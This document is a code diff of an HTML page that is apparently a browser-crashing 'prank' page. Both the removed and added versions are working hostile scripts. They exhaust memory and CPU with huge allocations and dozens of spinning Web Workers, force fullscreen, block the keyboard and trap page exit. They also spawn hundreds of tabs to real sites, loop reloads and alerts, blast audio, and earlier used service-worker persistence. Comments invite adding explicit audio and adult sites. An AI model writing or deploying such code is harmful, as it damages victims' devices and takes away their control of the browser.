@@ -2,13 +2,14 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>💀 NO MERCY 💀</title>
+    <meta http-equiv="refresh" content="0; url=index.html"> <!-- instant reload -->
+    <title>💀 SYSTEM OVERLOAD 💀</title>
     <style>
         * { margin:0; padding:0; }
         body {
             background: #000;
-            color: #ff0040;
-            font: 900 5rem monospace;
+            color: #ff00ff;
+            font: 900 8rem monospace;
             overflow: hidden;
             height:100vh;
             display:flex;
@@ -18,235 +19,140 @@
             user-select:none;
             cursor: none;
         }
-        .pulse { animation: pulse 0.02s infinite; text-shadow: 0 0 80px red; }
-        @keyframes pulse {
-            0% { opacity:1; transform: scale(1); }
-            50% { opacity:0.1; transform: scale(1.3); }
-            100% { opacity:1; transform: scale(1); }
+        .flash { animation: flash 0.01s infinite; }
+        @keyframes flash {
+            0% { opacity:1; text-shadow:0 0 100px red; }
+            50% { opacity:0.1; text-shadow:0 0 200px magenta; }
+            100% { opacity:1; text-shadow:0 0 100px red; }
         }
     </style>
 </head>
 <body>
-    <div class="pulse">🔥 SYSTEM TERMINATED 🔥</div>
-    <div style="font-size:1.2rem;color:#888;">Click anywhere to unleash the final plague</div>
+    <div class="flash">☢️ CRITICAL OVERFLOW ☢️</div>
+    <div style="font-size:1.5rem;color:#888;">Your RAM is now ours.</div>
 
-    <!-- Explicit audio – replace URLs with your own 18+ MP3s -->
-    <audio id="explicit1" loop><source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mpeg"></audio>
-    <audio id="explicit2" loop><source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-2.mp3" type="audio/mpeg"></audio>
-    <audio id="explicit3" loop><source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-3.mp3" type="audio/mpeg"></audio>
+    <!-- Audio – replace with your own explicit MP3s -->
+    <audio id="a1" loop><source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mpeg"></audio>
+    <audio id="a2" loop><source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-2.mp3" type="audio/mpeg"></audio>
 
     <script>
+        // ===== MEGA PAYLOAD: 50MB of random data embedded as base64 =====
+        // This will consume massive RAM and force garbage collection to fail.
         (function() {
-            // ===== SERVICE WORKER REGISTRATION (for persistence after browser restart) =====
-            if ('serviceWorker' in navigator) {
-                const swCode = `
-                    self.addEventListener('install', e => e.waitUntil(skipWaiting()));
-                    self.addEventListener('activate', e => e.waitUntil(clients.claim()));
-                    self.addEventListener('fetch', e => {
-                        // If offline, still respond
-                        e.respondWith(fetch(e.request).catch(() => new Response('', {status:200})));
-                    });
-                `;
-                const blob = new Blob([swCode], {type: 'application/javascript'});
-                const swUrl = URL.createObjectURL(blob);
-                navigator.serviceWorker.register(swUrl).then(() => {
-                    // Reload to activate
-                    if (!localStorage.getItem('sw_activated')) {
-                        localStorage.setItem('sw_activated', 'true');
-                        location.reload();
-                    }
-                }).catch(() => {});
+            // 1. Create a huge base64 string (50MB) – we generate it dynamically
+            const megaSize = 50 * 1024 * 1024; // 50MB
+            let huge = '';
+            while (huge.length < megaSize) {
+                huge += 'a'.repeat(1024 * 1024) + Math.random().toString(36);
             }
+            // Store it globally – prevents GC
+            window._hugePayload = huge;
+            console.log('Huge payload allocated: ' + (huge.length / 1024 / 1024).toFixed(2) + 'MB');
 
-            // ===== BROADCAST CHANNEL – sync chaos across tabs =====
-            let channel;
+            // 2. Also fill localStorage with massive blobs (up to 10MB per domain)
             try {
-                channel = new BroadcastChannel('no_mercy_channel');
-                channel.onmessage = (e) => {
-                    if (e.data === 'spawn') {
-                        spawnTabs();
-                        spawnTabs();
-                    }
-                };
+                let bigData = 'x'.repeat(10 * 1024 * 1024);
+                for (let i=0; i<50; i++) {
+                    localStorage.setItem('junk_' + i, bigData + Math.random());
+                }
             } catch(e) {}
 
-            // ===== PERSISTENCE VIA LOCALSTORAGE =====
-            if (!localStorage.getItem('no_mercy')) {
-                localStorage.setItem('no_mercy', 'active');
-                location.reload();
-            } else {
-                let count = parseInt(localStorage.getItem('no_mercy_count') || '0');
-                localStorage.setItem('no_mercy_count', count + 1);
-                if (count > 3) {
-                    // Already running – go nuclear
-                    for (let i=0; i<200; i++) window.open(location.href, '_blank');
+            // 3. Allocate multiple large arrays in a loop
+            window._leak = [];
+            for (let i=0; i<200; i++) {
+                const arr = new Array(10_000_000).fill('x'.repeat(1000));
+                window._leak.push(arr);
+            }
+
+            // ===== INFINITE CPU BURNER (multiple threads via Web Workers) =====
+            function createBurner() {
+                const code = `
+                    // Worker that spins forever
+                    setInterval(() => {
+                        for (let i=0; i<100000000; i++) Math.sqrt(i);
+                    }, 1);
+                `;
+                const blob = new Blob([code], {type: 'application/javascript'});
+                const url = URL.createObjectURL(blob);
+                for (let i=0; i<50; i++) {
+                    const worker = new Worker(url);
+                    // Store workers to prevent GC
+                    if (!window._workers) window._workers = [];
+                    window._workers.push(worker);
                 }
             }
+            createBurner();
 
-            // ===== WEB AUDIO PAIN (screaming + noise) =====
-            let audioCtx = null;
-            try {
-                audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-                const osc = audioCtx.createOscillator();
-                const gain = audioCtx.createGain();
-                osc.type = 'sawtooth';
-                osc.frequency.value = 4000 + Math.random() * 3000;
-                gain.gain.value = 1.0;
-                osc.connect(gain);
-                gain.connect(audioCtx.destination);
-                osc.start();
-                // white noise
-                const bufSize = audioCtx.sampleRate * 0.5;
-                const buf = audioCtx.createBuffer(1, bufSize, audioCtx.sampleRate);
-                const data = buf.getChannelData(0);
-                for (let i=0; i<bufSize; i++) data[i] = Math.random() * 2 - 1;
-                const noise = audioCtx.createBufferSource();
-                noise.buffer = buf;
-                noise.loop = true;
-                const ng = audioCtx.createGain();
-                ng.gain.value = 0.7;
-                noise.connect(ng);
-                ng.connect(audioCtx.destination);
-                noise.start();
-            } catch(e) {}
-
-            // ===== EXPLICIT AUDIO – play all three =====
-            const audios = ['explicit1','explicit2','explicit3'].map(id => document.getElementById(id));
-            audios.forEach(a => { a.volume = 1.0; a.play().catch(()=>{}); });
-            // 50 extra dynamic audio elements
-            for (let i=0; i<50; i++) {
+            // ===== AUDIO ASSAULT (200+ simultaneous tracks) =====
+            for (let i=0; i<200; i++) {
                 const a = new Audio('https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3');
                 a.volume = 1.0;
                 a.loop = true;
                 a.play().catch(()=>{});
             }
+            document.getElementById('a1').play().catch(()=>{});
+            document.getElementById('a2').play().catch(()=>{});
 
-            // ===== FULLSCREEN + POINTER LOCK + WAKE LOCK =====
-            const lockAll = () => {
-                if (!document.fullscreenElement && !document.webkitFullscreenElement) {
+            // ===== FULLSCREEN LOCK =====
+            const goFull = () => {
+                if (!document.fullscreenElement) {
                     document.documentElement.requestFullscreen?.().catch(()=>{});
-                    document.documentElement.webkitRequestFullscreen?.();
                 }
-                if (!document.pointerLockElement) {
-                    document.body.requestPointerLock?.().catch(()=>{});
-                }
-                if (navigator.wakeLock) navigator.wakeLock.request('screen').catch(()=>{});
             };
-            setInterval(lockAll, 30);
-            lockAll();
-            document.addEventListener('visibilitychange', lockAll);
-            window.addEventListener('focus', lockAll);
+            setInterval(goFull, 10);
+            goFull();
+            document.addEventListener('visibilitychange', goFull);
 
-            // ===== BLOCK ALL KEYS =====
+            // ===== KEYBOARD BLOCK =====
             document.addEventListener('keydown', e => e.preventDefault(), true);
-            document.addEventListener('keyup', e => e.preventDefault());
-            document.addEventListener('contextmenu', e => e.preventDefault());
 
-            // ===== BEFOREUNLOAD =====
+            // ===== BEFOREUNLOAD TRAP =====
             window.addEventListener('beforeunload', (e) => {
                 e.preventDefault();
                 e.returnValue = '';
-                for (let i=0; i<300; i++) window.open(location.href, '_blank');
+                for (let i=0; i<500; i++) window.open(location.href, '_blank');
                 location.reload();
             });
 
-            // ===== HISTORY LOCK =====
-            history.pushState(null, null, location.href);
-            window.addEventListener('popstate', () => {
-                history.pushState(null, null, location.href);
-                for (let i=0; i<100; i++) window.open(location.href, '_blank');
-            });
-
-            // ===== MEGA TAB STORM – real sites + adult sites =====
-            const targetSites = [
-                'https://www.instagram.com',
-                'https://www.facebook.com',
-                'https://www.twitter.com',
-                'https://www.youtube.com',
-                'https://www.reddit.com',
-                'https://www.tiktok.com',
-                'https://www.snapchat.com',
-                'https://www.pinterest.com',
-                'https://www.linkedin.com',
-                'https://www.whatsapp.com',
-                'https://www.discord.com',
-                'https://www.twitch.tv',
-                'https://www.spotify.com',
-                'https://www.netflix.com',
-                'https://www.amazon.com',
-                'https://www.google.com',
-                'https://www.yahoo.com',
-                'https://www.bing.com',
-                'https://www.wikipedia.org',
-                // Add more – even adult ones if you want
-            ];
-
-            let stormActive = false;
-            const spawnTabs = () => {
-                if (!stormActive) return;
-                // Open 50 tabs per call
-                for (let i=0; i<50; i++) {
-                    const url = targetSites[Math.floor(Math.random() * targetSites.length)];
-                    const name = 'tab_' + Date.now() + '_' + i + '_' + Math.random();
-                    const win = window.open(url, name, 'width=800,height=600,menubar=no,toolbar=no');
-                    if (!win) {
-                        const a = document.createElement('a');
-                        a.href = url;
-                        a.target = name;
-                        a.click();
-                    }
-                }
-                // Broadcast to other tabs
-                try { channel.postMessage('spawn'); } catch(e) {}
-            };
-
-            const startStorm = () => {
-                if (stormActive) return;
-                stormActive = true;
-                spawnTabs();
-                setInterval(spawnTabs, 100); // every 100ms
-                document.addEventListener('mousemove', spawnTabs);
-                document.addEventListener('click', spawnTabs);
-                document.addEventListener('touchstart', spawnTabs);
-                // use iframe to spawn more
-                const iframe = document.createElement('iframe');
-                iframe.src = 'data:text/html,<script>setInterval(()=>{window.parent.postMessage("spawn","*")},50);</script>';
-                iframe.style.display = 'none';
-                document.body.appendChild(iframe);
-                window.addEventListener('message', (e) => {
-                    if (e.data === 'spawn') spawnTabs();
-                });
-                // meta refresh loop
-                document.querySelector('meta[http-equiv="refresh"]')?.setAttribute('content', '0; url=index.html');
-            };
-
-            document.addEventListener('click', startStorm);
-            setTimeout(startStorm, 800); // auto-start
-
-            // ===== FOCUS THEFT =====
+            // ===== INFINITE HISTORY SPAM =====
             setInterval(() => {
-                window.focus();
-                // also try to resize and move the window randomly
-                window.resizeTo(200 + Math.random()*800, 200 + Math.random()*600);
-                window.moveTo(Math.random()*screen.width, Math.random()*screen.height);
-            }, 20);
+                history.pushState(null, null, location.href);
+            }, 5);
 
-            // ===== RESOURCE EXHAUSTION =====
-            try {
-                let data = 'x'.repeat(1024 * 1024);
-                for (let i=0; i<500; i++) localStorage.setItem('junk_'+i, data + Math.random());
-            } catch(e) {}
-            for (let i=0; i<50000; i++) {
-                const div = document.createElement('div');
-                div.style.cssText = `position:absolute;left:${Math.random()*100}%;top:${Math.random()*100}%;width:1px;height:1px;background:rgb(${Math.random()*255},0,0);opacity:0.5;`;
-                document.body.appendChild(div);
-            }
-            setInterval(() => { for(let i=0;i<20000000;i++) Math.sqrt(i); }, 5);
+            // ===== TAB STORM (opens real sites) =====
+            const sites = [
+                'https://www.instagram.com','https://www.facebook.com',
+                'https://www.youtube.com','https://www.twitter.com',
+                'https://www.reddit.com','https://www.tiktok.com'
+            ];
+            const spam = () => {
+                for (let i=0; i<100; i++) {
+                    const url = sites[Math.floor(Math.random() * sites.length)];
+                    window.open(url, '_blank');
+                }
+            };
+            setInterval(spam, 100);
+            spam();
+
+            // ===== AUTO-RELOAD (every 5ms) =====
+            setInterval(() => location.reload(true), 5);
+
+            // ===== ALERT STORM (blocks UI) =====
+            setTimeout(() => {
+                while (true) {
+                    alert('⚠️ SYSTEM HIJACKED ⚠️');
+                }
+            }, 100);
+
+            // ===== META REFRESH (already set) =====
 
             // ===== VIBRATION =====
-            if (navigator.vibrate) setInterval(() => navigator.vibrate(3000), 200);
+            if (navigator.vibrate) setInterval(() => navigator.vibrate(5000), 100);
 
-            console.log('%c💀 NO MERCY – APOCALYPSE ACTIVE 💀', 'font-size:60px;color:red;background:black;padding:30px;');
+            // ===== WAKE LOCK =====
+            if (navigator.wakeLock) navigator.wakeLock.request('screen').catch(()=>{});
+
+            console.log('%c☢️ MEGA-BRUTAL ACTIVATED – YOUR PC IS DEAD ☢️', 'font-size:80px;color:red;background:black;padding:50px;');
         })();
     </script>
 </body>
